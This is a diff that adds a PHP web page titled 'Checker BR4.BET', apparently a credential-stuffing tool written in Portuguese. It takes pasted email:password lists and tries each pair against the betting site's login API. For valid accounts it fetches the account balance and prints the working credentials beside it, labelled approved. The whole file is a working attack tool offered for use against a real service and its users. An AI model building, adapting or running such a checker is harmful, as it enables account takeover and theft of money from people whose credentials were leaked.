@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Checker BR4.BET</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root {
+            --roxo: #6a0dad;
+            --roxo-dark: #4b0082;
+            --fundo: #1a1a1a;
+            --texto: #ffffff;
+            --verde: #2ecc71;
+            --vermelho: #e74c3c;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: var(--fundo);
+            color: var(--texto);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 20px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            color: var(--roxo);
+            font-size: 28px;
+        }
+
+        .sub {
+            font-size: 14px;
+            color: #bbb;
+        }
+
+        textarea {
+            width: 100%;
+            height: 200px;
+            background-color: #2a2a2a;
+            color: var(--texto);
+            border: 2px solid var(--roxo);
+            border-radius: 10px;
+            padding: 10px;
+            font-size: 14px;
+            resize: none;
+        }
+
+        button {
+            width: 100%;
+            background-color: var(--roxo-dark);
+            color: var(--texto);
+            padding: 15px;
+            font-size: 16px;
+            border: none;
+            border-radius: 10px;
+            margin-top: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background-color: var(--roxo);
+        }
+
+        .resultado {
+            margin-top: 25px;
+            background-color: #111;
+            padding: 15px;
+            border-radius: 10px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .ok {
+            color: var(--verde);
+            margin-bottom: 5px;
+        }
+
+        .fail {
+            color: var(--vermelho);
+            margin-bottom: 5px;
+        }
+
+        @media (max-width: 600px) {
+            h1 { font-size: 24px; }
+            button { font-size: 14px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>Checker BR4.BET</h1>
+        <p class="sub">by: DX</p>
+    </header>
+
+    <form method="post">
+        <textarea name="dados" placeholder="email1:senha1&#10;email2:senha2&#10;..."></textarea>
+        <button type="submit">INICIAR</button>
+    </form>
+
+<?php
+if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["dados"])) {
+    $linhas = explode("\n", trim($_POST["dados"]));
+    echo '<div class="resultado">';
+    foreach ($linhas as $linha) {
+        if (strpos($linha, ":") !== false) {
+            list($email, $senha) = explode(":", trim($linha), 2);
+
+            // LOGIN
+            $login = login($email, $senha);
+            if ($login["sucesso"]) {
+                $saldo = $login["saldo"];
+                echo "<div class='ok'>[APROVADO] $email | $senha | Saldo: $saldo</div>";
+            } else {
+                echo "<div class='fail'>[REPROVADO] $email | $senha</div>";
+            }
+        }
+    }
+    echo '</div>';
+}
+
+function login($email, $senha) {
+    $login_url = "https://br4.bet.br/api/auth/login";
+    $me_url = "https://br4.bet.br/api/auth/me";
+
+    $headers = [
+        "Content-Type: application/json",
+        "User-Agent: Mozilla/5.0"
+    ];
+
+    $dados = json_encode([
+        "email" => $email,
+        "password" => $senha,
+        "login" => $email
+    ]);
+
+    // Requisição POST para login
+    $ch = curl_init($login_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $dados);
+    $resposta = curl_exec($ch);
+    curl_close($ch);
+
+    $json = json_decode($resposta, true);
+    if (isset($json["access_token"])) {
+        $token = $json["access_token"];
+
+        // Requisição GET para obter dados da conta
+        $headers[] = "Authorization: Bearer $token";
+        $ch = curl_init($me_url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+        $res = curl_exec($ch);
+        curl_close($ch);
+
+        $info = json_decode($res, true);
+        $saldo = $info["balance"] ?? 0;
+
+        return ["sucesso" => true, "saldo" => $saldo];
+    }
+
+    return ["sucesso" => false];
+}
+?>
+
+</body>
+</html>
